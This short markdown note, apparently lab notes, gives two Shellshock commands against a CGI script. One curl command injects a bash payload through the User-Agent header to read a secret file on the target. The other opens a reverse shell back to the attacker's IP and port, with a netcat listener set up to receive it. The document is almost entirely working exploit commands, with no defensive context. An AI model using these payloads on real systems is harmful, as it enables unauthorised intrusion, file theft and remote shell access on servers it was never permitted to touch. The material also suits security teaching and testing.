## Shellshock Attack via CGI
```
$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /tmp/secret_2016015878.txt'" http://{target_ip}/cgi-bin/test.cgi
```

## Get Reverse Shell
```
$ nc -lv {PORT} # Terminal 1

$ curl -A "() { :; }; /bin/bash -i /dev/tcp/{MY_IP}/{PORT} 0<&1 2>&1" http://{target_ip}/cgi-bin/test.cgi

```
